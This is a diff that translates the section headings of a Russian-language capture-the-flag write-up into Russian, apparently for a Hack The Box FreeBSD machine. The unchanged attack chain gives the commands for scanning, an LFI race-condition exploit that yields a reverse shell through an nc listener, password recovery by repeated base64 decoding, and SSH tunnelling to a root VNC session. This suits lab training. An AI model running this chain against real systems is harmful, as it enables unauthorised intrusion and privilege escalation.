@@ -10,12 +10,12 @@
 ## Цепочка Атаки
 
 ```text
-Reconnaissance
+Разведка
 ├── nmap -sC -sV -A → 22 (OpenSSH 7.2 FreeBSD), 80 (Apache 2.4.29 FreeBSD PHP/5.6.32)
 └── / → "Temporary website to test local .php scripts"
     └── Ссылки: ini.php, info.php, listfiles.php, phpinfo.php
 
-Foothold (LFI Race Condition)
+Первичный Доступ (LFI Race Condition)
 ├── listfiles.php → pwdbackup.txt, browse.php
 ├── phpinfo.php → file_uploads = On (tmp_name offset)
 ├── phpinfolfi.py (PayloadsAllTheThings) → модификация:
@@ -25,14 +25,14 @@ Foothold (LFI Race Condition)
 ├── nc -lnvp 9001
 └── python3 phpinfolfi.py 10.129.1.254 80 100 → www shell
 
-Lateral Movement (Credentials)
+Боковое Перемещение (Credentials)
 ├── /var/log/httpd-access.log (Apache access log path)
 ├── ps -aux → Xvnc :1 (root)
 ├── /usr/local/www/apache24/data/pwdbackup.txt
 │   └── 13x base64 decode → <PASSWORD>
 └── ssh charix@10.129.1.254 → user.txt
 
-Privilege Escalation (VNC)
+Повышение Привилегий (VNC)
 ├── ~/secret.zip → scp → unzip (pass: <PASSWORD>)
 ├── netstat -an | grep LIST → 5801, 5901 (VNC localhost)
 ├── ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
